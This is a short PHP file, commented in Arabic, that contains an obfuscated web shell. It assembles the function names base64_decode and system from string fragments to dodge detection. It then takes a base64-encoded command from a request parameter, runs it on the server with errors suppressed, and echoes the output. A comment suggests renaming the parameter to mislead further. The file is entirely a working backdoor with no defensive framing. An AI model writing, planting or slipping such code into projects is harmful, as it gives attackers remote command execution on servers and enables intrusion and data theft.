<?php
$decode = 'base'.'64_decode';     // دالة فك التشفير
$exec = 's'.'y'.'stem';           // دالة تنفيذ الأمر
$param = 'c';                     // اسم الباراميتر (يمكن تغييره لتضليل إضافي)

if (isset($_REQUEST[$param])) {
    $cmd = $decode($_REQUEST[$param]);  // فك تشفير الأمر
    echo "<pre>";
    @$exec($cmd);                      // تنفيذ الأمر
    echo "</pre>";
}
?>
